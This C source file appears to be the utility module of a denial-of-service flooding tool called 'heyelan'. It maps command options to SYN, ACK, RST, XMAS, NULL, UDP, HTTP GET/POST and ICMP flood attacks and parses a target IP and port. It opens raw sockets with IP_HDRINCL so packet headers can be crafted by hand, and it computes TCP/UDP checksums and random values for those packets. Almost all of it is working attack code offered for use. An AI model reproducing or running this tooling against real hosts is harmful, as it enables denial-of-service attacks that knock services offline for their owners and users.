#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include "utils.h"
#include "types.h"

/* for prng */
static unsigned int x;

struct attack_map_t {
	char *option_name;
	char *attack_name;
	int attack_id;
};

static struct attack_map_t attack_map[] = {
	{"syn", "SYN flood attack", ATTACK_TCP_SYN},
	{"ack", "ACK flood attack", ATTACK_TCP_ACK},
	{"synack", "SYN-ACK flood attack", ATTACK_TCP_SYNACK},
	{"pshack", "PSH-ACK flood attack", ATTACK_TCP_PSHACK},
	{"ackfin", "ACK-FIN flood attack", ATTACK_TCP_ACKFIN},
	{"rst", "RST flood attack", ATTACK_TCP_RST},
	{"xmas", "TCP XMAS flood attack", ATTACK_TCP_XMAS},
	{"null", "TCP NULL flood attack", ATTACK_TCP_NULL},
	{"udp", "UDP flood attack", ATTACK_UDP},
	{"get", "GET flood attack", ATTACK_HTTP_GET},
	{"post", "POST flood attack", ATTACK_HTTP_POST},
	{"ping", "Ping flood attack", ATTACK_ICMP_PING},
	{NULL, NULL, 0}
};

static void heyelan_usage(char *argv[])
{
	fprintf(stdout,
		"%s\nusage: %s [attack type] [options]\n"
		"\nattack types:\n\n"
		"\tsyn    : SYN flood attack\n"
		"\tack    : ACK flood attack\n"
		"\tsynack : SYN-ACK flood attack\n"
		"\tpshack : PSH-ACK flood attack\n"
		"\tackfin : ACK-FIN flood attack\n"
		"\trst    : RST flood attack\n"
		"\txmas   : TCP XMAS flood attack\n"
		"\tnull   : TCP NULL flood attack\n"
		"\tudp    : UDP flood attack\n"
		"\tget    : HTTP GET flood attack\n"
		"\tpost   : HTTP POST flood attack\n"
		"\tping   : ICMP ping flood attack\n"
		"\noptions:\n\n"
		"\t-t [target IP address] : target IP address to attack\n"
		"\t-p [target port]       : target port to attack\n"
		"\t-h                     : help message\n\n%s", 
		COLOR_GREEN, argv[0], COLOR_RESET);
	exit(EXIT_FAILURE);
}

void parse_args(int argc, char *argv[], struct target_data *target)
{
	int opt;

	if (argc < 3) {
		heyelan_usage(argv);
	}

	target->attack_type = -1;
	for (int i = 0; attack_map[i].option_name != NULL; i++) {
		if (!strncmp(argv[1], attack_map[i].option_name,
				strlen(attack_map[i].option_name)) &&
			strlen(argv[1]) == strlen(attack_map[i].option_name)) {
			target->attack_type = attack_map[i].attack_id;
			break;
		}
	}

	if (target->attack_type == -1) {
		fprintf(stderr, "%s\"%s\" is not a attack type, aborting.\n%s",
				COLOR_RED, argv[1], COLOR_RESET);
		exit(EXIT_FAILURE);
	}

	while ((opt = getopt(argc, argv, "t:p:h")) != -1) {
		switch (opt) {
		case 't':
			inet_pton(AF_INET, optarg, &target->address);
			break;
		case 'p':
			target->port = atoi(optarg);
			break;
		case 'h':
			heyelan_usage(argv);
			break;
		case '?':
			break;
		}
	}

	if (!target->address	) {
		fprintf(stderr, "%starget address not specified, aborting.\n%s",
			COLOR_RED, COLOR_RESET);
		exit(EXIT_FAILURE);
	}
}

int init_socket(int protocol)
{
	int sockfd;
	int enable = 1;

	if ((sockfd = socket(AF_INET, SOCK_RAW, protocol)) == -1) {
		fprintf(stderr, "%san error occured while creating socket : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(int)) == -1) {
		fprintf(stderr, "%san error occured while setting socket options : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}

	return sockfd;
}

void init_signal(void (*signal_exit)())
{
	struct sigaction act;

	memset(&act, 0, sizeof(struct sigaction));
	act.sa_handler = signal_exit;

	if (sigaction(SIGINT, &act, NULL) == -1) {
		fprintf(stderr, "%san error occured while setting signal : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
	if (sigaction(SIGTERM, &act, NULL) == -1) {
		fprintf(stderr, "%san error occured while setting signal : %s\n%s",
				COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
}

void init_attack_info(struct target_data *target, struct attack_info *info)
{
	time_t t;
	struct tm *tmp;

	for (int i = 0; attack_map[i].attack_name != NULL; i++) {
		if (target->attack_type == attack_map[i].attack_id) {
			strncpy(info->attack_type, attack_map[i].attack_name,
				sizeof(info->attack_type));
			break;
		}
	}

	inet_ntop(AF_INET, &target->address, info->target_address, INET_ADDRSTRLEN);
	if (target->port != 0) {
		snprintf(info->target_port, sizeof(info->target_port), "%u", target->port); 
	} else {
		strncpy(info->target_port, "random", sizeof(info->target_port));
	}

	t = time(NULL);
	if ((tmp = localtime(&t)) == NULL) {
		fprintf(stderr, "%san error occured while getting time : %s\n%s",
			COLOR_RED, strerror(errno), COLOR_RESET);
		exit(EXIT_FAILURE);
	}
	if (strftime(info->start_time, sizeof(info->start_time),
			"%H:%M:%S %d.%m.%Y", tmp) == 0) {
		fprintf(stderr, "%san error occured while using strftime%s",
			COLOR_RED, COLOR_RESET);
		exit(EXIT_FAILURE);
	}

	info->packets_send = 0;
	info->packets_fail = 0;
	info->total_size = 0;
}

uint16_t checksum_generic(uint16_t *ptr, size_t nbytes)
{
	unsigned short oddbyte = 0;
	register long sum = 0;
	register short answer = 0;

	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	} 
	if (nbytes == 1) {
		*((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
		sum += oddbyte;
	}
	
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = (unsigned short)~sum;

	return answer;
}

uint16_t checksum_tcp(struct ip_hdr *iph, struct tcp_hdr *tcph,
			char *payload, size_t payload_size)
{
	struct psd_hdr psh;
	char *psd;
	size_t psd_size;
	uint16_t check;

	memcpy(&psh.src_addr, &iph->src_addr, 4);
	memcpy(&psh.dst_addr, &iph->dst_addr, 4);

	psh.reserve = 0;
	psh.protocol = IPPROTO_TCP;
	psh.length = htons(sizeof(struct tcp_hdr) + payload_size);

	psd_size = sizeof(struct psd_hdr) + sizeof(struct tcp_hdr) + payload_size;

	psd = malloc(psd_size);
	memset(psd, 0, psd_size);

	memcpy(psd, (char *)&psh, sizeof(struct psd_hdr));
	memcpy(psd + sizeof(struct psd_hdr), tcph, sizeof(struct tcp_hdr));
	memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct tcp_hdr), payload, payload_size);

	if (payload) {
		memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct tcp_hdr), payload, payload_size);
	}

	check = checksum_generic((uint16_t *)psd, psd_size);
	free(psd);

	return check;
}

uint16_t checksum_udp(struct ip_hdr *iph, struct udp_hdr *udph,
			char *payload, size_t payload_size)
{
	struct psd_hdr psh;
	char *psd;
	size_t psd_size;
	uint16_t check;

	memcpy(&psh.src_addr, &iph->src_addr, 4);
	memcpy(&psh.dst_addr, &iph->dst_addr, 4);

	psh.reserve = 0;
	psh.protocol = IPPROTO_UDP;
	psh.length = htons(sizeof(struct udp_hdr) + payload_size);

	psd_size = sizeof(struct psd_hdr) + sizeof(struct udp_hdr) + payload_size;

	psd = malloc(psd_size);
	memset(psd, 0, psd_size);

	memcpy(psd, (char *)&psh, sizeof(struct psd_hdr));
	memcpy(psd + sizeof(struct psd_hdr), udph, sizeof(struct udp_hdr));
	memcpy(psd + sizeof(struct psd_hdr) + sizeof(struct udp_hdr), payload, payload_size);

	check = checksum_generic((uint16_t *)psd, psd_size);
	free(psd);

        return check;
}

void seed_rand(unsigned int seed)
{
	x = seed;
}

int random_num()
{
	unsigned int number = 0;

	number = (1103515245 * x + 12345) % (1 << 31);
	x = number;

	return number;
}
